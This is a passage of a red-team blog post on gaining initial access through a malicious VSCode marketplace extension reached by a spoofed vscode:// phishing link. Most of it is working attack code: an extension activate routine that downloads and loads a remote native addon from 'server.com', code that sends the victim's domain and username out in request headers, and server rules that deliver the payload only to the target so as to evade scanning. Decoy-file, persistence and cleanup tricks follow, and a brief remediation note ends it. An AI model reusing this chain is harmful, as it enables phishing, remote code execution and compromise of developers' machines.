in the URL.</p><pre tabindex=0><code>  &#34;name&#34;: &#34;com&#34;,
  &#34;displayName&#34;: &#34;My Extension Name&#34;
</code></pre><p>By changing the <code>DisplayName</code> value, the below prompt will then be shown without altering our extension URL of <code>vscode://targetdomain.com</code></p><figure><img loading=lazy src=/vscode/6adumn48gdc4nfx5c3itn4wekmi4e8sq.png width=500></figure><p>In addition, any parameters appended to the URL will essentially be ignored (as they are simply passed to the extension by VSCode). This means we can construct the below URL in order to provide some additional context to our phish.</p><p><code>vscode://targetdomain.com/internal/path.html?login=true</code></p><p>When clicked, VSCode will open and show the prompt below.</p><figure><img loading=lazy src=/vscode/6hjev6j95j7a02sw44r9976dzf9b6k6r.png width=500></figure><p>At this point, we can begin writing our extension code.</p><h3 id=extension-code>Extension code<a hidden class=anchor aria-hidden=true href=#extension-code>#</a></h3><p>We will create our extension using the <a href=https://www.npmjs.com/package/generator-code>VS Code Extension Generator</a> and NodeJS. This step is already covered in our previously mentioned <a href=https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions>post</a> so we won&rsquo;t go into too much detail here.</p><p>The key thing to note is the name of our extension <code>com</code> which we will use to spoof the final extension URL.</p><pre tabindex=0><code>C:\Users\mattjohnson&gt;yo code

     _-----_     ╭──────────────────────────╮
    |       |    │   Welcome to the Visual  │
    |--(o)--|    │   Studio Code Extension  │
   `---------´   │        generator!        │
    ( _´U`_ )    ╰──────────────────────────╯
    /___A___\   /
     |  ~  |
   __&#39;.___.&#39;__
 ´   `  |° ´ Y `

? What type of extension do you want to create? New Extension (JavaScript)
? What&#39;s the name of your extension? com
? What&#39;s the identifier of your extension? com
? What&#39;s the description of your extension? Description
? Enable JavaScript type checking in &#39;jsconfig.json&#39;? No
? Initialize a git repository? No
? Which package manager to use? npm

Writing in C:\Users\mattjohnson\com...
   create com\.vscode\extensions.json
   create com\.vscode\launch.json
   create com\test\runTest.js
   create com\test\suite\extension.test.js
   create com\test\suite\index.js
   create com\.vscodeignore
   create com\README.md
   create com\CHANGELOG.md
   create com\vsc-extension-quickstart.md
   create com\jsconfig.json
   create com\extension.js
   create com\package.json
   create com\.eslintrc.json
</code></pre><p>After the template code is generated, we need to define our publisher in <code>package.json</code> to match our <code>publisherID</code> value, or we will get an error when uploading the <code>.vsix</code> file.</p><pre tabindex=0><code>  &#34;name&#34;: &#34;com&#34;,
  &#34;displayName&#34;: &#34;My Extension Name&#34;,
  &#34;publisher&#34;: &#34;targetdomain&#34;,
</code></pre><p>Inside of <code>extension.js</code>, we have many options available for code execution. One that fits into well with our existing toolset at MDSec is to leverage <a href=https://nodejs.org/api/addons.html>Node Native-Addons</a>.</p><p>Native-Addons are essentially DLLs intended to provide an interface between JavaScript running in Node.js and libraries written in C or C++. These can be loaded into our extension process via the use of the <code>require()</code> function.</p><p>Our activate method for our extension is below, fetching a remote Node Native-Addon from a remote server, writing it to disk and loading it into our extension process via our call to <code>require()</code>.</p><p><strong>Note</strong>: WebDAV / UNC paths are supported via <code>require()</code>, so we can also use this to avoid writing to disk, however, this does come with some caveats around the WebClient service.</p><pre tabindex=0><code>// This method is called when your extension is activated
// Your extension is activated the very first time the command is executed

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {

	function get_data(data, outfile){
		fs.writeFileSync(outfile, data);
		if(outfile.endsWith(&#34;.node&#34;)){
			require(process.env.LOCALAPPDATA + &#34;/encoding.node&#34;);
		}
	}
	
	async function get_module(path, outfile) {
	
		var options = {
			hostname: &#34;server.com&#34;,
			path: path,
			port: 443,
			};
	
		return new Promise((resolve) =&gt; {
	
			https.get(options, res =&gt; {
	
				var data = [];
	
				res.on(&#39;data&#39;, function(chunk) {
					data.push(chunk);
				}).on(&#39;end&#39;, function() {
					var buffer = Buffer.concat(data);
					get_data(buffer, outfile);
				});
			}) 
		})
	}
	
	(async () =&gt; await get_module(&#34;/api/v1/custom.js&#34;, process.env.LOCALAPPDATA + &#34;/encoding.node&#34;))();
</code></pre><p>In order to further expand our pre-text, we can optionally configure our extension to open a decoy file on disk inside of VSCode after the extension installs.</p><pre tabindex=0><code>		var openPath = vscode.Uri.parse(&#34;file:///&#34; + outfile);
		
		vscode.workspace.openTextDocument(openPath).then(doc =&gt; {
		vscode.window.showTextDocument(doc);
		});
</code></pre><p>This can be useful to help prevent raising suspicion from our target victim.</p><h3 id=limiting-execution>Limiting execution<a hidden class=anchor aria-hidden=true href=#limiting-execution>#</a></h3><p>In order to limit execution of our malicious extension to our target organisation, we will include some additional client side checks before running our payload.</p><p>The advantage of this approach is two fold. One, our attack is limited to our target domain and two, we can potentially bypass any automated code scanning.</p><p>To achieve this, we add the below code to our extension to fetch the required environment variables from our target and send them to our remote server.</p><pre tabindex=0><code>	async function get_module(path, outfile) {
	
		var options = {
			hostname: &#34;server.com&#34;,
			path: path,
			port: 443,
			headers: {
			  &#39;X-VSCode-Domain&#39;: process.env.USERDOMAIN,
			  &#39;X-VSCode-User&#39;: process.env.USERNAME,
			  &#39;X-VSCode-Arch&#39;: process.env.PROCESSOR_ARCHITECTURE
			  }
			};
</code></pre><p>On the server side, we can use the below Apache mod_rewrite rules to ensure we deliver the malicious <code>.node</code> file, only when the required conditions are met. If not, we deliver a benign <code>.node</code> file.</p><pre tabindex=0><code># If domain is correct
RewriteCond %{HTTP:X-VSCode-Domain} =targetdomain
# And username is correct
RewriteCond %{HTTP:X-VSCode-User} =victim
# Then send payload
RewriteRule ^.*$ &#34;/files/payload.node&#34; [END]
# Else send benign file
RewriteRule ^.*$ &#34;/files/fake.node&#34; [END]
</code></pre><h3 id=user-compromise>User compromise<a hidden class=anchor aria-hidden=true href=#user-compromise>#</a></h3><p>Once our <code>.vsix</code> file is compiled, we can upload it to our marketplace publisher account.</p><p><img alt=221587e31f8e4177f0085b536dda7e96.png loading=lazy src=/vscode/221587e31f8e4177f0085b536dda7e96.png></p><p>After automated analysis is completed, the extension will become available.</p><p><img alt=800c65b2b2e0d7ee42148eb912084beb.png loading=lazy src=/vscode/800c65b2b2e0d7ee42148eb912084beb.png></p><p>At this stage we can deliver our phishing link to the target using the below URL, appending any additional parameters as needed.</p><p><code>vscode://targetdomain.com/internal/login.html</code></p><p>After clicking on the link, the user will be prompted to open VSCode.</p><p><img alt=zqbqwedxcfahih682juu5y1dkufpzse6.png loading=lazy src=/vscode/zqbqwedxcfahih682juu5y1dkufpzse6.png></p><p>If they click on &ldquo;Install and Open&rdquo;, our extension will be installed and our <code>extension.js</code> code will execute from within <code>Code.exe</code>.</p><p>The below illustrates the end-to-end chain, establishing a C2 connection and displaying a decoy file inside of VSCode.</p><p><img alt=endtoend.gif loading=lazy src=/vscode/endtoend.gif></p><h3 id=persistence-via-extension-updates>Persistence via extension updates<a hidden class=anchor aria-hidden=true href=#persistence-via-extension-updates>#</a></h3><p>By default, VSCode will update extensions automatically if an update is available. If we want to make a change to the extension code, we simply need to recompile our <code>.vsix</code> and upload the new version to the marketplace.</p><p>Once caveat with this approach is that after the extension has been updated, we will need to wait for VSCode to restart in order for the new extension code to be executed.</p><p>We can work around this by adding the below line into our extension to force a refresh of VSCode if a certain condition is met.</p><p><code>vscode.commands.executeCommand('workbench.action.reloadWindow');</code></p><h3 id=cleanup>Cleanup<a hidden class=anchor aria-hidden=true href=#cleanup>#</a></h3><p>Currently, there appears to be no way to remove a publisher from the marketplace using the web interface. Instead, the below steps can be used to remove it using <code>vsce</code>.</p><p>First, create a personal access token from the Azure dev portal <a href=https://dev.azure.com/>https://dev.azure.com/</a></p><figure><img loading=lazy src=/vscode/uqd40lrto4orr6j4nsfbgtjzcz22vg5x.png width=750></figure><p>Then set the below scopes.</p><figure><img loading=lazy src=/vscode/5pbujq9xxncrjaad3mavuv0y5vwsry5f.png width=500></figure><p>Finally, use the below <code>vsce</code> command to remove the publisher providing the token when prompted.</p><pre tabindex=0><code>C:\Users\mattjohnson&gt;vsce delete-publisher targetdomain
https://marketplace.visualstudio.com/manage/publishers/
Personal Access Token for publisher &#39;targetdomain&#39;: ****************************************************

The Personal Access Token verification succeeded for the publisher &#39;targetdomain&#39;.
This will FOREVER delete &#39;targetdomain&#39;! Are you sure? [y/N] y
 DONE  Deleted publisher &#39;targetdomain&#39;.
</code></pre><h3 id=remediation>Remediation<a hidden class=anchor aria-hidden=true href=#remediation>#</a></h3><p>The techniques described here leverage intended functionality of both VSCode and the VSCode Marketplace. Further validation could be performed by Microsoft by limiting Publisher IDs to verified domains only, preventing the domain impersonation issue.</p><p>Microsoft MSRC was contacted with the details of the post prior to publication but did not respond before the proposed disclosure deadline.</p><p>As an additional hardening measure, the VSCode URI handler can be disabled by clearing the registry key at the below path.</p><pre tabindex=0><code>Computer\HKEY_CLASSES_ROOT\vscode\shell\open\command
</code></pre><p>This will prevent external URLs from being able to be opened inside of VSCode.</p><p><strong>This article was also posted on <a href=https://www.mdsec.co.uk/2023/08/leveraging-vscode-extensions-for-initial-access/>mdsec.co.uk</a></strong></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://breakfix.co/posts/extracting-account-connectivity-credentials-accs/><span class=title>« Prev</span><br><span>Extracting Account Connectivity Credentials (ACCs) from Symantec Management Agent (aka Altiris)</span>
</a><a class=next href=https://breakfix.co/posts/airstrike-attack-cve-2021-28316/><span class=title>Next »</span><br><span>Airstrike Attack - FDE bypass and EoP on domain joined Windows workstations (CVE 2021-28316)</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://breakfix.co/></a></span>·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>